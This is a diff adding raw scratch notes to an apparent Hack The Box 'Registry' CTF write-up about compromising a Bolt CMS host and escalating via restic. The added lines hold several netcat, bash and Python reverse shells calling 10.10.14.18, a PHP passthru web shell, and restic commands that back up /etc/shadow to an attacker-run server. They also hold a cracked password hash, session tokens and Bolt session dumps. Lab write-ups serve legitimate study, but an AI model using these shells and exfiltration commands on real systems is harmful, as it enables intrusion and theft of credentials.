@@ -105,14 +105,21 @@ Authorization: Basic YWRtaW46YWRtaW4=
   * The `runc` command but there's nothing from its side either.
   * There's also the `registry serve /etc/docker/registry/config.yml` command that neither the command exists nor the file in the path exists.  
 
-nc -l -p 1234 > mysql
+nc -l -p 7777 > linpeas
 
-nc -w 3 10.10.10.159 1234 < mysql  
+nc -w 3 10.10.10.159 7777 < linpeas  
 
 * This could be something `/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request`.  
 * Use SUID3NUM it's nice. Relieves the burden of searching through the SUID binaries and checking if it's normal that they have the sticky bit or not. ( And it's legit in OSCP)  
 
+* `./rest-server --path /tmp/restic --no-auth --debug`
+
+restic restore -r "/tmp/restic/new" latest --target .
+restic backup -r rest:http://127.0.0.1:8000/new ~/html/backup.php
 * SOMETHING!!!  
+
+
+sudo restic backup -r rest:http://172.18.0.1/v2/bolt-image /etc/shadow
 
 ```console
 CREATE TABLE bolt_authtoken (
@@ -142,7 +149,90 @@ The bolt_authtoken cookie is used to store a token for your identification in th
 
 Cookie: bolt_authtoken=a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1234 >/tmp/f
 
+
+git config --global user.name "Bob den Otter"
+git config --global user.email bobdenotter@gmail.com
+
+```
+a:3:{s:15:"_sf2_attributes";a:2:{s:20:"_csrf/https-user_new";s:43:"OpaDHvzFZJQH0mZo_JDlwlwJ3KOkJQDLX8C6ZV-omjE";s:24:"_csrf/https-content_edit";s:43:"AIAWJDPagn5x8pQy7goMdlbIIzhrANy-7xSeKrfCIrY";}s:12:"_sf2_flashes";a:1:{s:7:"success";a:1:{i:0;s:35:"You've been logged on successfully.";}}s:9:"_sf2_meta";a:3:{s:1:"u";i:1570569906;s:1:"c";i:1570569853;s:1:"l";s:1:"0";}}
+```
+
+```
+a:3:{s:15:"_sf2_attributes";a:5:{s:20:"_csrf/https-user_new";s:43:"OpaDHvzFZJQH0mZo_JDlwlwJ3KOkJQDLX8C6ZV-omjE";s:24:"_csrf/https-content_edit";s:43:"AIAWJDPagn5x8pQy7goMdlbIIzhrANy-7xSeKrfCIrY";s:14:"authentication";O:30:"Bolt\AccessControl\Token\Token":3:{s:7:"*user";O:25:"Bolt\Storage\Entity\Users":19:{s:5:"*id";i:1;s:11:"*username";s:5:"admin";s:11:"*password";N;s:8:"*email";s:17:"bolt@registry.htb";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2019-10-08 21:25:07.090205";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:9:"*lastip";s:12:"192.168.1.52";s:14:"*displayname";s:5:"Admin";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:1:"1";s:10:"*user_id";i:1;s:8:"*token";s:64:"a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2";s:7:"*salt";s:32:"f8e7da1a2b9ea7109e0bdeedb6e85135";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2019-10-08 21:25:07.092936";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:12:"192.168.1.52";s:12:"*useragent";s:120:"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2019-10-22 21:25:07.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1570569907;}s:5:"stack";a:0:{}s:23:"_csrf/https-file_upload";s:43:"pYJR4fLx6gqMfTgPxGduppLKqdiYzkA0i0kjuhEYofA";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1570569941;s:1:"c";i:1570569853;s:1:"l";s:1:"0";}}
+```
+
+
+```
+a:3:{s:15:"_sf2_attributes";a:6:{s:16:"_csrf/user_login";s:43:"bqf7H9soxjE6k_yTsXycUSmAxXh72_lvBeXyYkeWFrM";s:18:"_csrf/content_edit";s:43:"y-N3-d898AIt1Okwzyg9KldynhyhxUK2xuX_yJT0ngc";s:14:"authentication";O:30:"Bolt\AccessControl\Token\Token":3:{s:7:"*user";O:25:"Bolt\Storage\Entity\Users":19:{s:5:"*id";i:1;s:11:"*username";s:5:"admin";s:11:"*password";N;s:8:"*email";s:17:"bolt@registry.htb";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2019-10-17 14:34:52.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:9:"*lastip";s:10:"10.10.14.2";s:14:"*displayname";s:5:"Admin";s:8:"*stack";a:1:{i:0;s:17:"files://shell.php";}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";i:2;s:10:"*user_id";i:1;s:8:"*token";s:64:"b48aa43041667445fee64f70e3bf680a621bdd650e9efb2ba8c61cb72545619f";s:7:"*salt";s:32:"4df19b4fbbadb9649e3e6c2b1ed3f1ba";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2019-10-17 14:34:52.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:10:"10.10.14.2";s:12:"*useragent";s:68:"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2019-10-31 14:34:52.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1571654393;}s:5:"stack";a:1:{i:0;s:17:"files://shell.php";}s:15:"_csrf/file_edit";s:43:"vtjeUz44Q6fL0H6qqQs6QXBdw6PxMtRbLxUScVRIu00";s:17:"_csrf/file_upload";s:43:"AT2sOaPyuPIAqmLsH5hht6AkbBTxVCs1KeHjdUGuNys";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1571654475;s:1:"c";i:1571322886;s:1:"l";i:0;}}
+```
+
+* Found this commit   
+```
+commit 42af4fd3a178de245cf11aced78d7354fde2e246
+Author: ToBe998 <tobe@topolis.de>
+Date:   Wed Sep 12 22:17:25 2018 +0200
+
+    Added method to login as specific user without password (#7664)
+    
+    * Added method to login as specific user without pasword
+    
+    As discussed on Slack, the added `loinAsUser()` method enabled extension crea
+tors to override the login mechanics and connect bolt to various kinds of SSO sys
+tems. Since the logic for user management and authentication is currently (pre 4.
+1) not centralized enough, a lot of needed code would have to be duplicated to ar
+chive this. (And we certainly dont want to go there ;) )
+    
+    PS: The file is identical to 3.5 and could also be backported?
+    
+    I can provide guides on how to do this if needed.
+    
+    * phpdoc updated
+    
+    * Update Login.php
+    
+    * code reviews
+    
+    * Update Login.php
+    
+    * Update Login.php
+
+```  
+
+* I found the login page.
+* Turns out the profiler is the key.
+
+FOUND PASSWORD `$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry`  
+
+* Web shell  
+```php
+<?php 
+passthru($_REQUEST['cmd']);
+?>
+```  
+
+sudo restic backup -r "rest:http://10.10.14.18:1234/ABCDEFU" "/etc/shadow"
+./rest-server --listen ":12345"
+restic init -r "rest:http://127.0.0.1/bolt"
+restic init -r "rest:http://localhost:$RPORT/$NAME"
+/tmp/rest-server --listen ":5555" --no-auth
+restic -r /tmp/restShit restore c0075dc5 --target /tmp/restOut
+restic backup -r restShit restore c0075dc5 --target /tmp/restOut 
+
+restic -r restShit dump latest /tmp/restOut > restore.tar
+chown -R bolt.bolt /tmp/restShit
+
+```
+sudo restic backup -r rest:http://localhost/backup /etc/shadow
+bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.159 1234 >/tmp/f
+export RHOST="10.10.14.18";export RPORT=80;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+```  
+
+* web server `DocumentRoot /var/www/html`.
 ## <span style="color:#9933FF">How Did I Solve the Machine 😎🥳 
 
 
